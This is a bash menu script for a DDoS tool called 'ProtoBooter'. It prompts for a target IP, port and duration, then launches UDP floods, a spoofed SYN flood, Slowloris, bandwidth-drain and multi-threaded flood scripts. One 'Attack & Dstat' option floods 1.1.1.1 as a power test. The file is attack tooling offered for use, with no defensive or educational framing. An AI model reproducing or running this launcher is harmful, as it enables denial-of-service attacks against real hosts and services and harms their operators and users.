#!/bin/bash
BLACK='\e[0;30m'
BLUE='\e[0;34m'
GREEN='\e[0;32m'
CYAN='\e[0;36m'
RED='\e[0;31m'
PURPLE='\e[0;35m'
BROWN='\e[0;33m'
LIGHTGRAY='\e[0;37m'
DARKGRAY='\e[1;30m'
LIGHTBLUE='\e[1;34m'
LIGHTGREEN='\e[1;32m'
LIGHTCYAN='\e[1;36m'
LIGHTRED='\e[1;31m'
LIGHTPURPLE='\e[1;35m'
YELLOW='\e[1;33m'
WHITE='\e[1;37m'
NC='\e[0m'              # No Color
# Trap Signal Script
#
#TitaniumScript.bypass//BASH  Bypass.Function
#load
exit_script()
{
  echo "* * *Trap * * *"
  ./menu
}

dstat1()
{
    clear
    echo -e " ${CYAN} "
	echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                          ADMIN DSTAT                              ��� "
    echo "  +-----------------------------------------------------------------------+ "                                                         
dstat
    
}

admin12()
{
    clear
    echo -e " ${CYAN} "
	echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                          ADMIN PANEL                              ��� "
    echo "  +-----------------------------------------------------------------------+ "                                                         
echo "Im Sure You Can Create Your Own Panel :3"
echo "If You Really Dont Know How You Can Contact Me On Skype"
echo "My Skype Is Not Very Hard To Find (TheTrueAlphaZ)"
read ok
clear
    
}

udp_flooda()
{
    clear
    echo -e " ${BLUE} "
	echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                        PRIVATE VERSION 4.0 !                      ��� "
    echo "  +-----------------------------------------------------------------------+ "                                                         
    echo -e "  ���${CYAN}                              ProtoBooter${CYAN}                           ��� " 
    echo -e "  ���${CYAN}                               SCRIPT${CYAN}                              ��� " 
    echo -e "  ���${CYAN}                                 BY${BLUE}                                ��� "
    echo -e "  ���${BLUE}                            MODZ PROTOBOOTER${GREEN}                       ��� "
    echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                           Version 1.0                             ��� "
    echo "  ���+--------------------------------------------------------------------� " 
    echo "  ���                              UDP DRAXz                            ��� "
    echo "  +-----------------------------------------------------------------------+ "
echo "Enter target ip please :"
read ip
echo "Enter a Port Number :"
read port
echo "Enter a the time :"
read time
./gott.1.pl $ip $port 0 $time
}

udp_floodb()
{
    clear
    echo -e " ${BLUE} "
	echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                        PRIVATE VERSION 4.0 !                      ��� "
    echo "  +-----------------------------------------------------------------------+ "                                                         
    echo -e "  ���${CYAN}                              PROTOBOOTER${CYAN}                          ��� " 
    echo -e "  ���${CYAN}                               SCRIPT${CYAN}                              ��� " 
    echo -e "  ���${CYAN}                                 BY${BLUE}                                ��� "
    echo -e "  ���${BLUE}                            MODZ PROTOBOOTER${GREEN}                      ��� "
    echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                           Version 1.0                             ��� "
    echo "  ���+--------------------------------------------------------------------� " 
    echo "  ���                                  UDP                              ��� "
    echo "  +-----------------------------------------------------------------------+ "
echo "Enter target ip please :"
read ip
echo "Enter a Port Number :"
read port
echo "Enter the time :"
read time
python gott.2.py $ip $port $time
}

slap()
{
    clear
    echo -e " ${BLUE} "
	echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                        PRIVATE VERSION 4.0 !                      ��� "
    echo "  +-----------------------------------------------------------------------+ "                                                         
    echo -e "  ���${CYAN}                              PROTOBOOTER${CYAN}                          ��� " 
    echo -e "  ���${CYAN}                               SCRIPT${CYAN}                              ��� " 
    echo -e "  ���${CYAN}                                 BY${BLUE}                                ��� "
    echo -e "  ���${BLUE}                            MODZ PROTOBOOTER${GREEN}                      ��� "
    echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                           Version 4.0                             ��� "
    echo "  ���+--------------------------------------------------------------------� " 
    echo "  ���                            GoTT DRAXz                             ��� "
    echo "  +-----------------------------------------------------------------------+ "
echo "Enter target ip please :"
read ip
perl gott.3.pl $ip
}

slowloris()
{
    clear
    echo -e " ${BLUE} "
	echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                        PRIVATE VERSION 4.0 !                      ��� "
    echo "  +-----------------------------------------------------------------------+ "                                                         
    echo -e "  ���${CYAN}                              PROTOBOOTER${CYAN}                          ��� " 
    echo -e "  ���${CYAN}                               SCRIPT${CYAN}                              ��� " 
    echo -e "  ���${CYAN}                                 BY${BLUE}                                ��� "
    echo -e "  ���${BLUE}                            MODZ PROTOBOOTER${GREEN}                      ��� "
    echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                           Version 1.0                             ��� "
    echo "  ���+--------------------------------------------------------------------� " 
    echo "  ���                        Slowloris DRAXz                             ��� "
    echo "  +-----------------------------------------------------------------------+ "
echo "To stop this script after execution hold [CTRL] + [C]"
echo "Enter website address :"
read host
echo "Enter a port :"
read port
./slowloris $host $port
}

killall()
{
    clear
    echo -e " ${BLUE} "
	echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                        PRIVATE VERSION 4.0 !                      ��� "
    echo "  +-----------------------------------------------------------------------+ "                                                         
    echo -e "  ���${CYAN}                              PROTOBOOTER${CYAN}                          ��� " 
    echo -e "  ���${CYAN}                               SCRIPT${CYAN}                              ��� " 
    echo -e "  ���${CYAN}                                 BY${BLUE}                                ��� "
    echo -e "  ���${BLUE}                            MODZ PROTOBOOTER${GREEN}                      ��� "
    echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                           Version 1.0                             ��� "
    echo "  ���+--------------------------------------------------------------------� " 
pkill gott.1.pl
pkill gott.2.py
pkill gott.2.pl
pkill gott.4.pl
pkill slowloris
}

fry()
{
    clear
    echo -e " ${BLUE} "
	echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                        PRIVATE VERSION 4.0 !                      ��� "
    echo "  +-----------------------------------------------------------------------+ "                                                         
    echo -e "  ���${CYAN}                              ProtoBooter${CYAN}                             ��� " 
    echo -e "  ���${CYAN}                               SCRIPT${CYAN}                              ��� " 
    echo -e "  ���${CYAN}                                 BY${BLUE}                                ��� "
    echo -e "  ���${BLUE}                            MODZ ProtoBooter${GREEN}                         ��� "
    echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                           Version 1.1                             ��� "
    echo "  ���+--------------------------------------------------------------------� " 
    echo "  ���             SUPER Nytro BY PROTOBOOTER STOP WITH CTRL+C              ��� "
    echo "  +-----------------------------------------------------------------------+ "
echo "Enter IP Address :"
read ip
echo "Enter Port :"
read port
echo "Enter size :"
read size
echo "Enter the time in seconds :"
read time
perl nytro.pl $ip $port $size $time

}

and()
{
    clear
    echo -e " ${BLUE} "
	echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                        PRIVATE VERSION 4.0 !                      ��� "
    echo "  +-----------------------------------------------------------------------+ "                                                         
    echo -e "  ���${CYAN}                              PROTOBOOTER${CYAN}                          ��� " 
    echo -e "  ���${CYAN}                               SCRIPT${CYAN}                              ��� " 
    echo -e "  ���${CYAN}                                 BY${BLUE}                                ��� "
    echo -e "  ���${BLUE}                               PROTOBOOTER${GREEN}                        ��� "
    echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                           Version 2.0                             ��� "
    echo "  ���+-----------------------------------------------------------------+��� " 
    echo "  ���                     Attack And Dstat Cant be stop                 ��� "
    echo "  +-----------------------------------------------------------------------+ "
echo "Note : This Script Will Show You Your Power"
echo "The Test Is Only 20 Seconds After You Stop Dstat With CTRL+C"
echo "Press Enter :)"
read enter
perl nytro.pl 1.1.1.1 80 65500 20 & dstat

}

autoinstall()
{

clear
./install
}

bw()
{
    clear
    echo -e " ${BLUE} "
	echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                        PRIVATE VERSION 4.0 !                      ��� "
    echo "  +-----------------------------------------------------------------------+ "                                                         
    echo -e "  ���${CYAN}                              PROTOBOOTER${CYAN}                          ��� " 
    echo -e "  ���${CYAN}                               SCRIPT${CYAN}                              ��� " 
    echo -e "  ���${CYAN}                                 BY${BLUE}                                ��� "
    echo -e "  ���${BLUE}                            MODZ PROTOBOOTER${GREEN}                      ��� "
    echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                           Version 1.0                             ��� "
    echo "  ���+--------------------------------------------------------------------� " 
    echo "  ���                    Bandwidth Drain DRAXz                     ��� "
    echo "  +-----------------------------------------------------------------------+ "
echo "Enter target ip please :"
read ip
echo "Enter a Port Number :"
read port
echo "Enter a the time :"
read time
./gott -i $ip -p $port -s 32000 -t $time
}

multi()
{
    clear
    echo -e " $CYAN} "
    echo "               PROTOBOOTER MULTI FLOOD UPDATED "   
    echo "Script created by gott and get updated by ProtoBooter"
    echo ""	
    echo -e "        '||    ||'          '||    .    || " 
    echo -e "         |||  |||  ... ...   ||  .||.  ...  "
    echo -e "         |'|..'||   ||  ||   ||   ||    ||  "
    echo -e "         | '|' ||   ||  ||   ||   ||    ||  "
    echo -e "        .|. | .||.  '|..'|. .||.  '|.' .||. "
    echo ""
    echo "    He who dare to play god must pay a steep price."
    echo ""
echo "Enter IP Address :"
read ip
echo "Enter Port :"
read port
echo "Enter size Ex: 65500"
read size
echo "Enter the time in seconds :"
read time
echo "Enter the thread count :"
read threads
echo "Would you like to see the output WARNING if yes flood may slow down! 0=No 1=Yes"
read output
perl multi.pl $ip $port $size $time $threads $output
}

syn()
{
    clear
    echo -e " ${BLUE} "
	echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                        PRIVATE VERSION 4.0 !                      ��� "
    echo "  +-----------------------------------------------------------------------+ "                                                         
    echo -e "  ���${CYAN}                              PROTOBOOTER${CYAN}                          ��� " 
    echo -e "  ���${CYAN}                               SCRIPT${CYAN}                              ��� " 
    echo -e "  ���${CYAN}                                 BY${BLUE}                                ��� "
    echo -e "  ���${BLUE}                            MODZ PROTOBOOTER${GREEN}                      ��� "
    echo "  +-----------------------------------------------------------------------+ "
    echo "  ���                           Version 1.0                             ��� "
    echo "  ���+--------------------------------------------------------------------� " 
    echo "  ���                    Spoofed SyN Flood coded in C                   ��� "
    echo "  +-----------------------------------------------------------------------+ "
echo "Enter target ip please :"
read ip
echo "Enter a Port Number :"
read port
./syn $ip $port
}

exit_script1()
{
  exit 1
}

Take_input1()
{
clear
while :
do
clear
echo -e "${WHITE}Created By ProtoBooter${RED}                           User:"${LIGHTBLUE}$(whoami)"${RED}Expires:"${LIGHTBLUE}Never
echo -e "${WHITE}                                                PRIVATE MENU 6.0 ENJOY
Bypass [${GREEN}ON${WHITE}]                             "${WHITE}Your Version: "${GREEN}v6.0 "${RED}[Private Verison]
echo -e "${WHITE}
   #   P   r   o   j   e   c   t            ProtoBooter Private 6.0 ${WHITE}
  / \ / \ / \ / \ / \ / \ / \ / \         ---------------------------------${CYAN}
 ( P | R | O | T | O | N | E | T )${LIGHTBLUE}       � You are connected to ProtoBooter �${WHITE}
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/         ---------------------------------
"${WHITE}
    echo -e "${WHITE}Note: "${GREEN}TO EXIT A SCRIPT OR STOP ATTACKS PRESS [CTRL+C] KILL ALL ATTACKS WITH 14
    echo -e "${GREEN}[==============================================================================]"
	echo -e "${LIGHTBLUE}[1]${GREEN}UDP Flood${LIGHTBLUE}                                             [5]${GREEN}Bandwidth${LIGHTBLUE}"                                                                                         																									
    echo -e "${LIGHTBLUE}[2]${GREEN}UDP Flood B${LIGHTBLUE}                                           [6]${GREEN}SyN Flood${BLUE}"
    echo -e "${LIGHTBLUE}[3]${GREEN}Xtreme FlooD${LIGHTBLUE}                                          [7]${LIGHTBLUE}MULTI UPDATED${CYAN}"
    echo -e "${LIGHTBLUE}[4]${GREEN}SLOWLORIS${LIGHTBLUE}                                             [8]${GREEN}PROTOBOOTER SCRIPT${LIGHTBLUE}"
    echo -e ""                                                                 
    echo -e "${PURPLE}[==============================================================================]"
    echo -e "${PURPLE}                                 ~OPTIONS~                                      "
    echo -e "${LIGHTBLUE}[9]${GREEN}Change Password${LIGHTBLUE}                                       [AI]${GREEN}Installer"
	echo -e "${LIGHTBLUE}[10]${GREEN}Dstat${LIGHTBLUE}                                                [12]${GREEN}Admin Panel"
	echo -e "${LIGHTBLUE}[11]${GREEN}Attack & Dstat${LIGHTBLUE}                                       [13]${GREEN}Exit Menu"
    echo -e ""
    echo -n "#ProtoBooter - Menu [1-13-AI]: "
    read yourch
    case $yourch in
      1) udp_flooda ;;
      2) udp_floodb ;;
      3) slap ;;
	  4) slowloris ;;
	  8) fry ;;
         5) bw ;;
         6) syn ;;
	  14) killall ;;
	  9) passwd ;;
	  7) multi ;;
	  10) dstat1 ;;
	  11) and ;;
	  12) admin12 ;;
	  AI) autoinstall ;;
      ex) echo "As you Command" ;  exit 1  ;;
	  13) pkill menu  ;;
      *) echo "Invalid Selection, Please make another selection between [1-11]" ;
         echo "Press Enter. . ." ; read ;;
 esac
done # end_while
}
#
# Set trap to for CTRL+C interrupt i.e. Install our error handler
# When occurs it first it calls del_file() and then exit
#
trap exit_script 2
#
# Call our user define function : Take_input1
#
Take_input1